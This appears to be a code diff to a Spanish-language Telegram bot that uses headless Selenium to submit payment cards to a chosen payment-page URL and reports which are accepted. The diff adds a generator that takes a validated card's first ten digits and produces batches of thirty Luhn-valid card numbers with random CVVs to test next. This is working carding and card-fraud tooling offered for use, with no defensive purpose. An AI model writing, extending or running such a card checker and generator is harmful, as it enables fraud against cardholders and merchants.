@@ -3,6 +3,8 @@ import re
 import sys
 import time
 import json
+import html
+import random
 import asyncio
 import datetime
 import threading
@@ -121,6 +123,10 @@ user_conversations: Dict[int, dict] = {}
 # user_id -> {'stop_event': threading.Event(), 'driver': driver, 'running': bool}
 active_jobs: Dict[int, dict] = {}
 
+# Última tarjeta válida registrada por usuario
+# user_id -> {'p16': str, 'p4': str, 'p3': str, 'card_str': str, 'url': str}
+user_valid_cards: Dict[int, dict] = {}
+
 # =====================================================================
 # PARSER DE TARJETAS
 # =====================================================================
@@ -195,6 +201,51 @@ def formatear_tarjeta_str(p16: str, p4: str, p3: str) -> str:
     """Devuelve la tarjeta en formato estándar 0000000000000000|MM/YY|CVV"""
     exp = f"{p4[:2]}/{p4[2:]}" if len(p4) == 4 else p4
     return f"{p16}|{exp}|{p3}"
+
+def calcular_luhn(quince: str) -> str:
+    """Calcula el 16º dígito de control usando el algoritmo de Luhn."""
+    suma = 0
+    for i, dig in enumerate(quince):
+        n = int(dig)
+        if i % 2 == 0:
+            n *= 2
+            if n > 9:
+                n -= 9
+        suma += n
+    return str((10 - (suma % 10)) % 10)
+
+def generar_30_tarjetas(prefix_10: str, p4: str = "0329", p3: str = "458") -> List[str]:
+    """
+    Toma los primeros 10 caracteres del número de tarjeta de la válida y genera 30
+    tarjetas aleatorias con formato NUMERO|MM|AA|CVV y algoritmo de Luhn verificado.
+    """
+    prefix_clean = re.sub(r"\D", "", str(prefix_10))[:10]
+    if len(prefix_clean) < 10:
+        prefix_clean = prefix_clean.ljust(10, "0")
+
+    # Mantener el mes y año de la válida si están disponibles
+    if p4 and len(p4) >= 4:
+        mm = p4[:2]
+        yy = p4[2:4]
+    else:
+        mm = f"{random.randint(1, 12):02d}"
+        yy = f"{random.randint(28, 32):02d}"
+
+    tarjetas = []
+    vistos = set()
+    intentos = 0
+    while len(tarjetas) < 30 and intentos < 500:
+        intentos += 1
+        cinco_azar = f"{random.randint(0, 99999):05d}"
+        quince = prefix_clean + cinco_azar
+        c16 = quince + calcular_luhn(quince)
+        if c16 in vistos:
+            continue
+        vistos.add(c16)
+        cvv = f"{random.randint(100, 999):03d}"
+        tarjetas.append(f"{c16}|{mm}|{yy}|{cvv}")
+
+    return tarjetas
 
 # =====================================================================
 # MOTOR SELENIUM (EDGE)
@@ -672,24 +723,53 @@ def ejecutar_proceso_chequeo(chat_id: int, user_id: int, url: str, tarjetas: Lis
     stop_event = job_info['stop_event']
     driver = None
 
-    def enviar_telegram(texto: str):
-        """Envía mensaje a Telegram desde el hilo secundario."""
+    def enviar_telegram(texto: str, reply_markup=None):
+        """Envía mensaje a Telegram desde el hilo secundario con soporte HTML y botones."""
         try:
-            coro = bot_app.bot.send_message(chat_id=chat_id, text=texto)
-            asyncio.run_coroutine_threadsafe(coro, loop).result(timeout=10)
+            coro = bot_app.bot.send_message(
+                chat_id=chat_id,
+                text=texto,
+                parse_mode="HTML",
+                reply_markup=reply_markup,
+                disable_web_page_preview=True
+            )
+            return asyncio.run_coroutine_threadsafe(coro, loop).result(timeout=10)
         except Exception as e:
             print(f"[!] Error enviando mensaje a Telegram: {e}")
+            try:
+                texto_limpio = re.sub(r"<[^>]+>", "", texto)
+                coro = bot_app.bot.send_message(
+                    chat_id=chat_id,
+                    text=texto_limpio,
+                    reply_markup=reply_markup,
+                    disable_web_page_preview=True
+                )
+                return asyncio.run_coroutine_threadsafe(coro, loop).result(timeout=10)
+            except Exception:
+                pass
 
     try:
         driver = crear_driver(es_headless=True)
         job_info['driver'] = driver
 
         total = len(tarjetas)
-        enviar_telegram(f"🚀 Iniciando chequeo de {total} tarjeta(s)...\n🌐 URL: {url}")
+        msg_inicio = (
+            f"🚀 <b><code>╔════════════════════════════════════════╗</code></b>\n"
+            f"🚀 <b><code>║       INICIANDO CHEQUEO ({total} CARDS)    ║</code></b>\n"
+            f"🚀 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+            f"🌐 <b><code>URL OBJETIVO:</code></b>\n"
+            f"<code>{html.escape(url)}</code>\n\n"
+            f"⚡ <b><code>ESTADO: Procesando tarjetas secuencialmente...</code></b>"
+        )
+        enviar_telegram(msg_inicio)
 
         for idx, tarjeta in enumerate(tarjetas, 1):
             if stop_event.is_set():
-                enviar_telegram("⏹️ Chequeo detenido por el usuario.")
+                enviar_telegram(
+                    f"⏹️ <b><code>╔════════════════════════════════════════╗</code></b>\n"
+                    f"⏹️ <b><code>║      CHEQUEO DETENIDO POR EL USUARIO   ║</code></b>\n"
+                    f"⏹️ <b><code>╚════════════════════════════════════════╝</code></b>"
+                )
                 break
 
             p16, p4, p3 = tarjeta
@@ -698,36 +778,73 @@ def ejecutar_proceso_chequeo(chat_id: int, user_id: int, url: str, tarjetas: Lis
             estado, detalle, url_redireccion = probar_tarjeta(driver, 1, url, tarjeta, stop_event)
 
             if estado == "STOPPED":
-                enviar_telegram("⏹️ Chequeo detenido por el usuario.")
+                enviar_telegram(
+                    f"⏹️ <b><code>╔════════════════════════════════════════╗</code></b>\n"
+                    f"⏹️ <b><code>║      CHEQUEO DETENIDO POR EL USUARIO   ║</code></b>\n"
+                    f"⏹️ <b><code>╚════════════════════════════════════════╝</code></b>"
+                )
                 break
 
             if estado == "VALIDA":
-                # Requisito: mensaje como valida y debajo el link copiado de arriba
+                url_final = url_redireccion or url
+                prefix_10 = p16[:10]
+
+                # Registrar la tarjeta válida en memoria para el generador
+                user_valid_cards[user_id] = {
+                    'p16': p16,
+                    'p4': p4,
+                    'p3': p3,
+                    'card_str': card_str,
+                    'url': url_final
+                }
+
+                keyboard = [
+                    [
+                        InlineKeyboardButton("🌐 Nueva URL", callback_data="btn_nueva_url"),
+                        InlineKeyboardButton("⚡ Generar", callback_data=f"btn_gen_{prefix_10}")
+                    ]
+                ]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+
                 msg_valida = (
-                    f"✅ VALIDA\n"
-                    f"💳 {card_str}\n\n"
-                    f"{url_redireccion}"
+                    f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
+                    f"✅ <b><code>║         ¡¡¡ ESTADO: VALIDA !!!        ║</code></b>\n"
+                    f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+                    f"💳 <b><code>TARJETA VÁLIDA:</code></b>\n"
+                    f"<code>{html.escape(card_str)}</code>\n\n"
+                    f"🔗 <b><code>ENLACE DE REDIRECCIÓN:</code></b>\n"
+                    f"<code>{html.escape(url_final)}</code>\n\n"
+                    f"🤖 <b><code>¿Qué deseas hacer ahora? Selecciona:</code></b>"
                 )
-                enviar_telegram(msg_valida)
+                enviar_telegram(msg_valida, reply_markup=reply_markup)
                 # Al encontrar la válida, se detiene el lote
                 break
             else:
-                # Requisito: si no pone valida saldra como INVALID y lo manda al telegram
                 msg_invalid = (
-                    f"❌ INVALID\n"
-                    f"💳 {card_str}\n"
-                    f"Motivo: {detalle}"
+                    f"❌ <b><code>╔════════════════════════════════════════╗</code></b>\n"
+                    f"❌ <b><code>║            ESTADO: INVALID            ║</code></b>\n"
+                    f"❌ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+                    f"💳 <b><code>TARJETA:</code></b>\n"
+                    f"<code>{html.escape(card_str)}</code>\n\n"
+                    f"⚠️ <b><code>MOTIVO:</code></b> <b><code>{html.escape(detalle or 'Autenticación fallida')}</code></b>"
                 )
                 enviar_telegram(msg_invalid)
 
             if idx < total and not stop_event.is_set():
                 time.sleep(1.0)
         else:
-            enviar_telegram("🏁 Chequeo completado. Todas las tarjetas han sido procesadas.")
+            enviar_telegram(
+                f"🏁 <b><code>╔════════════════════════════════════════╗</code></b>\n"
+                f"🏁 <b><code>║       PROCESO FINALIZADO              ║</code></b>\n"
+                f"🏁 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+                f"✅ <b><code>Todas las tarjetas han sido comprobadas.</code></b>"
+            )
 
     except Exception as e:
         registrar_log(1, "", "ERROR", f"Error general en hilo de chequeo: {e}")
-        enviar_telegram(f"⚠️ Ocurrió un error durante la ejecución: {e}")
+        enviar_telegram(
+            f"⚠️ <b><code>[ERROR CRÍTICO] {html.escape(str(e))}</code></b>"
+        )
     finally:
         if driver:
             cerrar_driver_seguro(driver, 1)
@@ -740,18 +857,22 @@ def ejecutar_proceso_chequeo(chat_id: int, user_id: int, url: str, tarjetas: Lis
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Comando /start y bienvenida."""
     user = update.effective_user
+    nombre = user.first_name.upper() if user and user.first_name else "USUARIO"
     msg = (
-        f"👋 ¡Hola, {user.first_name}!\n\n"
-        f"Bienvenido al Bot de Chequeo.\n\n"
-        f"📌 **Comandos Disponibles:**\n"
-        f"🔹 `/chk` : Iniciar chequeo. Te pedirá las tarjetas (de 1 a 10) y luego la URL si no tienes una guardada.\n"
-        f"🔹 `/chk <tarjeta(s)>` : Iniciar chequeo pasando las tarjetas directamente.\n"
-        f"🔹 `/url <nueva_url>` : Guardar o cambiar tu URL personal para futuros `/chk`.\n"
-        f"🔹 `/url` : Ver tu URL configurada actual.\n"
-        f"🔹 `/stop` : Detener el chequeo en curso.\n\n"
-        f"ℹ️ Cada usuario tiene su propia URL guardada de forma 100% independiente."
+        f"🤖 <b><code>╔════════════════════════════════════════╗</code></b>\n"
+        f"🤖 <b><code>║   SISTEMA AUTOFILL // CHECKER BOT     ║</code></b>\n"
+        f"🤖 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+        f"👋 <b><code>BIENVENIDO, {html.escape(nombre)}</code></b>\n\n"
+        f"⚡ <b><code>COMANDOS DEL SISTEMA:</code></b>\n"
+        f"▫️ <b><code>/chk</code></b> ➔ <b><code>Iniciar chequeo de tarjetas</code></b>\n"
+        f"▫️ <b><code>/chk &lt;tarjetas&gt;</code></b> ➔ <b><code>Chequeo rápido directo</code></b>\n"
+        f"▫️ <b><code>/url &lt;enlace&gt;</code></b> ➔ <b><code>Guardar o cambiar tu URL</code></b>\n"
+        f"▫️ <b><code>/url</code></b> ➔ <b><code>Consultar tu URL configurada</code></b>\n"
+        f"▫️ <b><code>/stop</code></b> ➔ <b><code>Detener el chequeo en curso</code></b>\n\n"
+        f"🛡️ <b><code>MODO INDEPENDIENTE: Cada usuario tiene su propia URL aislada.</code></b>\n"
+        f"⚙️ <b><code>ESTADO: SISTEMA EN LÍNEA Y OPERATIVO</code></b>"
     )
-    await update.message.reply_text(msg, parse_mode="Markdown")
+    await update.message.reply_text(msg, parse_mode="HTML")
 
 async def cmd_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
@@ -769,35 +890,53 @@ async def cmd_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         user_manager.set_url(user_id, nueva_url)
         await update.message.reply_text(
-            f"✅ **URL actualizada con éxito para tu usuario:**\n`{nueva_url}`\n\n"
-            f"Se usará automáticamente en tus próximos `/chk`.",
-            parse_mode="Markdown"
+            f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
+            f"✅ <b><code>║     URL ACTUALIZADA CON ÉXITO         ║</code></b>\n"
+            f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+            f"🔗 <b><code>NUEVA URL:</code></b>\n"
+            f"<code>{html.escape(nueva_url)}</code>\n\n"
+            f"⚡ <b><code>Se usará automáticamente en tus próximos /chk.</code></b>",
+            parse_mode="HTML"
         )
     else:
         url_actual = user_manager.get_url(user_id)
         if url_actual:
             await update.message.reply_text(
-                f"📌 **Tu URL guardada actual es:**\n`{url_actual}`\n\n"
-                f"Para cambiarla por una nueva, usa:\n`/url <nueva_url>`",
-                parse_mode="Markdown"
+                f"📌 <b><code>╔════════════════════════════════════════╗</code></b>\n"
+                f"📌 <b><code>║        URL CONFIGURADA ACTUAL          ║</code></b>\n"
+                f"📌 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+                f"🔗 <b><code>URL ASIGNADA:</code></b>\n"
+                f"<code>{html.escape(url_actual)}</code>\n\n"
+                f"💡 <b><code>Para cambiarla por otra, escribe:</code></b>\n"
+                f"<b><code>/url &lt;nueva_url&gt;</code></b>",
+                parse_mode="HTML"
             )
         else:
             await update.message.reply_text(
-                f"⚠️ **No tienes ninguna URL guardada todavía.**\n\n"
-                f"Para guardar una, escribe:\n`/url <tu_url>`",
-                parse_mode="Markdown"
+                f"⚠️ <b><code>╔════════════════════════════════════════╗</code></b>\n"
+                f"⚠️ <b><code>║        SIN URL CONFIGURADA            ║</code></b>\n"
+                f"⚠️ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+                f"ℹ️ <b><code>No tienes ninguna URL guardada todavía.</code></b>\n\n"
+                f"💡 <b><code>Para configurar una, escribe:</code></b>\n"
+                f"<b><code>/url &lt;tu_url&gt;</code></b>",
+                parse_mode="HTML"
             )
 
 async def iniciar_chequeo_usuario(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, chat_id: int, url: str, tarjetas: List[Tuple[str, str, str]]):
     """Inicia el trabajo de chequeo en segundo plano."""
     if user_id in active_jobs:
-        await context.bot.send_message(chat_id=chat_id, text="⏳ Ya tienes un chequeo activo. Usa `/stop` si deseas cancelarlo.")
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text="⏳ <b><code>[AVISO] Ya tienes un chequeo activo. Usa /stop si deseas cancelarlo.</code></b>",
+            parse_mode="HTML"
+        )
         return
 
     if not tarjetas:
         await context.bot.send_message(
             chat_id=chat_id,
-            text="❌ No se proporcionaron tarjetas válidas para chequear."
+            text="❌ <b><code>[ERROR] No se proporcionaron tarjetas válidas para chequear.</code></b>",
+            parse_mode="HTML"
         )
         return
 
@@ -830,7 +969,10 @@ async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
 
     if user_id in active_jobs:
-        await update.message.reply_text("⏳ Ya tienes un chequeo en ejecución. Puedes detenerlo con `/stop`.")
+        await update.message.reply_text(
+            "⏳ <b><code>[AVISO] Ya tienes un chequeo en ejecución. Puedes detenerlo con /stop.</code></b>",
+            parse_mode="HTML"
+        )
         return
 
     # Si se pasaron tarjetas en el mismo comando (/chk 4150...)
@@ -840,13 +982,22 @@ async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if tarjetas:
         if len(tarjetas) > 10:
             tarjetas = tarjetas[:10]
-            await update.message.reply_text("ℹ️ Has indicado más de 10 tarjetas. Se comprobarán solo las primeras 10.")
+            await update.message.reply_text(
+                "ℹ️ <b><code>[INFO] Has indicado más de 10 tarjetas. Se comprobarán solo las primeras 10.</code></b>",
+                parse_mode="HTML"
+            )
 
         saved_url = user_manager.get_url(user_id)
         if saved_url:
             await update.message.reply_text(
-                f"🔍 **Usando tu URL guardada:**\n`{saved_url}`\n\n⏳ Iniciando proceso para {len(tarjetas)} tarjeta(s)...",
-                parse_mode="Markdown"
+                f"🔍 <b><code>╔════════════════════════════════════════╗</code></b>\n"
+                f"🔍 <b><code>║      INICIANDO CHEQUEO RÁPIDO         ║</code></b>\n"
+                f"🔍 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+                f"🌐 <b><code>URL GUARDADA:</code></b>\n"
+                f"<code>{html.escape(saved_url)}</code>\n\n"
+                f"📊 <b><code>Tarjetas a procesar:</code></b> <b><code>{len(tarjetas)}</code></b>\n"
+                f"⏳ <b><code>Iniciando motor de automatización...</code></b>",
+                parse_mode="HTML"
             )
             await iniciar_chequeo_usuario(update, context, user_id, chat_id, saved_url, tarjetas)
         else:
@@ -855,9 +1006,11 @@ async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 'pending_cards': tarjetas
             }
             await update.message.reply_text(
-                f"✅ {len(tarjetas)} tarjeta(s) recibida(s).\n\n"
-                f"🌐 **Por favor, introduce la URL** de la página de pago para realizar el chequeo:",
-                parse_mode="Markdown"
+                f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
+                f"✅ <b><code>║    TARJETAS RECIBIDAS: {len(tarjetas):<14} ║</code></b>\n"
+                f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+                f"🌐 <b><code>Por favor, introduce la URL de pago para el chequeo:</code></b>",
+                parse_mode="HTML"
             )
     else:
         # No se pasaron tarjetas: pedirlas interactivamente
@@ -866,10 +1019,12 @@ async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             'pending_cards': []
         }
         await update.message.reply_text(
-            "💳 **Por favor, envía las tarjetas a comprobar:**\n"
-            "Puedes enviar de 1 hasta 10 tarjetas (una por línea) con el formato:\n"
-            "`4150070033612022|03|29|458`",
-            parse_mode="Markdown"
+            f"💳 <b><code>╔════════════════════════════════════════╗</code></b>\n"
+            f"💳 <b><code>║       INTRODUCE LAS TARJETAS          ║</code></b>\n"
+            f"💳 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+            f"📝 <b><code>Envía de 1 a 10 tarjetas con el formato:</code></b>\n"
+            f"<code>4150070033612022|03|29|458</code>",
+            parse_mode="HTML"
         )
 
 async def manejar_mensaje_texto(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -884,21 +1039,47 @@ async def manejar_mensaje_texto(update: Update, context: ContextTypes.DEFAULT_TY
 
     paso = conv.get('step')
 
+    # NUEVO PASO: Cuando el usuario presionó el botón 'Nueva URL'
+    if paso == 'AWAITING_NEW_URL':
+        url = texto
+        if not (url.startswith("http://") or url.startswith("https://")):
+            url = "https://" + url
+
+        user_manager.set_url(user_id, url)
+        user_conversations.pop(user_id, None)
+
+        await update.message.reply_text(
+            f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
+            f"✅ <b><code>║     NUEVA URL GUARDADA CON ÉXITO      ║</code></b>\n"
+            f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+            f"🔗 <b><code>URL CONFIGURADA:</code></b>\n"
+            f"<code>{html.escape(url)}</code>\n\n"
+            f"⚡ <b><code>Ya está guardada para tus próximos chequeos con /chk.</code></b>",
+            parse_mode="HTML"
+        )
+        return
+
     # PASO 1: Esperando las tarjetas (de 1 a 10)
     if paso == 'AWAITING_CARDS':
         tarjetas = parsear_tarjetas_texto(texto)
         if not tarjetas:
             await update.message.reply_text(
-                "❌ **Formato no válido.** No se detectó ninguna tarjeta correcta.\n\n"
-                "Por favor, envía entre 1 y 10 tarjetas con el formato:\n"
-                "`4150070033612022|03|29|458`",
-                parse_mode="Markdown"
+                f"❌ <b><code>╔════════════════════════════════════════╗</code></b>\n"
+                f"❌ <b><code>║        FORMATO NO VÁLIDO              ║</code></b>\n"
+                f"❌ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+                f"⚠️ <b><code>No se detectó ninguna tarjeta correcta.</code></b>\n\n"
+                f"📝 <b><code>Envía de 1 a 10 tarjetas con el formato:</code></b>\n"
+                f"<code>4150070033612022|03|29|458</code>",
+                parse_mode="HTML"
             )
             return
 
         if len(tarjetas) > 10:
             tarjetas = tarjetas[:10]
-            await update.message.reply_text("ℹ️ Se han detectado más de 10 tarjetas. Se comprobarán únicamente las primeras 10.")
+            await update.message.reply_text(
+                "ℹ️ <b><code>[INFO] Se han detectado más de 10 tarjetas. Se comprobarán solo las primeras 10.</code></b>",
+                parse_mode="HTML"
+            )
 
         conv['pending_cards'] = tarjetas
 
@@ -907,18 +1088,23 @@ async def manejar_mensaje_texto(update: Update, context: ContextTypes.DEFAULT_TY
         if saved_url:
             user_conversations.pop(user_id, None)
             await update.message.reply_text(
-                f"✅ {len(tarjetas)} tarjeta(s) cargada(s).\n"
-                f"🔍 **Usando tu URL guardada:**\n`{saved_url}`\n\n"
-                f"⏳ Iniciando chequeo...",
-                parse_mode="Markdown"
+                f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
+                f"✅ <b><code>║    TARJETAS CARGADAS: {len(tarjetas):<15} ║</code></b>\n"
+                f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+                f"🔍 <b><code>USANDO TU URL GUARDADA:</code></b>\n"
+                f"<code>{html.escape(saved_url)}</code>\n\n"
+                f"⏳ <b><code>Iniciando chequeo...</code></b>",
+                parse_mode="HTML"
             )
             await iniciar_chequeo_usuario(update, context, user_id, chat_id, saved_url, tarjetas)
         else:
             conv['step'] = 'AWAITING_URL'
             await update.message.reply_text(
-                f"✅ {len(tarjetas)} tarjeta(s) recibida(s).\n\n"
-                f"🌐 **Por favor, introduce la URL** de la página de pago para realizar el chequeo:",
-                parse_mode="Markdown"
+                f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
+                f"✅ <b><code>║    TARJETAS RECIBIDAS: {len(tarjetas):<14} ║</code></b>\n"
+                f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+                f"🌐 <b><code>Por favor, introduce la URL de pago para el chequeo:</code></b>",
+                parse_mode="HTML"
             )
         return
 
@@ -940,10 +1126,13 @@ async def manejar_mensaje_texto(update: Update, context: ContextTypes.DEFAULT_TY
         reply_markup = InlineKeyboardMarkup(keyboard)
 
         await update.message.reply_text(
-            f"🔗 **URL recibida:**\n`{url}`\n\n"
-            f"¿Deseas guardar este enlace para tus próximos `/chk`?",
+            f"🔗 <b><code>╔════════════════════════════════════════╗</code></b>\n"
+            f"🔗 <b><code>║             URL RECIBIDA              ║</code></b>\n"
+            f"🔗 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+            f"<code>{html.escape(url)}</code>\n\n"
+            f"💾 <b><code>¿Deseas guardar este enlace para tus próximos /chk?</code></b>",
             reply_markup=reply_markup,
-            parse_mode="Markdown"
+            parse_mode="HTML"
         )
         return
 
@@ -958,7 +1147,10 @@ async def manejar_callback_guardar(update: Update, context: ContextTypes.DEFAULT
 
     conv = user_conversations.pop(user_id, None)
     if not conv or 'pending_url' not in conv:
-        await query.edit_message_text("⚠️ Sesión expirada o no encontrada. Por favor, vuelve a usar `/chk`.")
+        await query.edit_message_text(
+            "⚠️ <b><code>[SESIÓN EXPIRADA] Por favor, vuelve a usar /chk.</code></b>",
+            parse_mode="HTML"
+        )
         return
 
     url = conv['pending_url']
@@ -967,16 +1159,82 @@ async def manejar_callback_guardar(update: Update, context: ContextTypes.DEFAULT
     if data == "save_url_yes":
         user_manager.set_url(user_id, url)
         await query.edit_message_text(
-            f"💾 **URL guardada con éxito para futuros `/chk`:**\n`{url}`\n\n🚀 Iniciando chequeo...",
-            parse_mode="Markdown"
+            f"💾 <b><code>╔════════════════════════════════════════╗</code></b>\n"
+            f"💾 <b><code>║         URL GUARDADA CON ÉXITO        ║</code></b>\n"
+            f"💾 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+            f"<code>{html.escape(url)}</code>\n\n"
+            f"🚀 <b><code>Iniciando chequeo...</code></b>",
+            parse_mode="HTML"
         )
     else:
         await query.edit_message_text(
-            f"👌 **URL no guardada (se usará solo para esta prueba):**\n`{url}`\n\n🚀 Iniciando chequeo...",
-            parse_mode="Markdown"
+            f"👌 <b><code>╔════════════════════════════════════════╗</code></b>\n"
+            f"👌 <b><code>║     URL TEMPORAL (SOLO ESTA PRUEBA)   ║</code></b>\n"
+            f"👌 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+            f"<code>{html.escape(url)}</code>\n\n"
+            f"🚀 <b><code>Iniciando chequeo...</code></b>",
+            parse_mode="HTML"
         )
 
     await iniciar_chequeo_usuario(update, context, user_id, chat_id, url, tarjetas)
+
+async def manejar_callback_acciones_valida(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Maneja las acciones de una tarjeta válida: 'Nueva URL' y 'Generar 30'."""
+    query = update.callback_query
+    await query.answer()
+
+    user_id = query.from_user.id
+    chat_id = query.message.chat_id
+    data = query.data
+
+    if data == "btn_nueva_url":
+        user_conversations[user_id] = {'step': 'AWAITING_NEW_URL'}
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=(
+                f"🌐 <b><code>╔════════════════════════════════════════╗</code></b>\n"
+                f"🌐 <b><code>║        CONFIGURAR NUEVA URL           ║</code></b>\n"
+                f"🌐 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+                f"📝 <b><code>Por favor, envía la nueva URL de la pasarela:</code></b>\n"
+                f"<code>https://...</code>\n\n"
+                f"⚡ <b><code>Se guardará de inmediato en tu perfil.</code></b>"
+            ),
+            parse_mode="HTML"
+        )
+    elif data.startswith("btn_gen_"):
+        prefix = data.replace("btn_gen_", "")[:10]
+
+        info_valida = user_valid_cards.get(user_id, {})
+        p4 = info_valida.get('p4', "0329")
+        p3 = info_valida.get('p3', "458")
+
+        cards_30 = generar_30_tarjetas(prefix, p4, p3)
+        texto_cards = "\n".join(cards_30)
+
+        keyboard = [
+            [
+                InlineKeyboardButton("⚡ Generar otras 30", callback_data=f"btn_gen_{prefix}"),
+                InlineKeyboardButton("🌐 Nueva URL", callback_data="btn_nueva_url")
+            ]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        msg_gen = (
+            f"🎲 <b><code>╔════════════════════════════════════════╗</code></b>\n"
+            f"🎲 <b><code>║        GENERADOR: 30 TARJETAS         ║</code></b>\n"
+            f"🎲 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+            f"📌 <b><code>PREFIJO BASE (10 DÍGITOS):</code></b> <b><code>{html.escape(prefix)}</code></b>\n"
+            f"📊 <b><code>TOTAL GENERADAS:</code></b> <b><code>30 unidades</code></b>\n\n"
+            f"<pre><code>{texto_cards}</code></pre>\n\n"
+            f"💡 <b><code>Toca el bloque de código para copiarlo al portapapeles.</code></b>"
+        )
+
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=msg_gen,
+            parse_mode="HTML",
+            reply_markup=reply_markup
+        )
 
 async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Detiene el chequeo en curso del usuario."""
@@ -991,9 +1249,18 @@ async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 cerrar_driver_seguro(driver, 1)
             except Exception:
                 pass
-        await update.message.reply_text("⏹️ Solicitud de detención enviada. El navegador se cerrará en breve.")
+        await update.message.reply_text(
+            f"⏹️ <b><code>╔════════════════════════════════════════╗</code></b>\n"
+            f"⏹️ <b><code>║       ORDEN DE PARADA RECIBIDA        ║</code></b>\n"
+            f"⏹️ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+            f"🛑 <b><code>Deteniendo chequeo y cerrando navegador...</code></b>",
+            parse_mode="HTML"
+        )
     else:
-        await update.message.reply_text("ℹ️ No tienes ningún chequeo activo en este momento.")
+        await update.message.reply_text(
+            f"ℹ️ <b><code>[INFO] No tienes ningún chequeo activo en este momento.</code></b>",
+            parse_mode="HTML"
+        )
 
 # =====================================================================
 # INICIALIZACIÓN DE LA APLICACIÓN
@@ -1016,6 +1283,7 @@ def main():
 
     # Handlers para flujo interactivo de URL y botones
     app.add_handler(CallbackQueryHandler(manejar_callback_guardar, pattern=r"^save_url_"))
+    app.add_handler(CallbackQueryHandler(manejar_callback_acciones_valida, pattern=r"^(btn_nueva_url|btn_gen_)"))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, manejar_mensaje_texto))
 
     print("[✓] Bot conectado a Telegram y escuchando mensajes...")
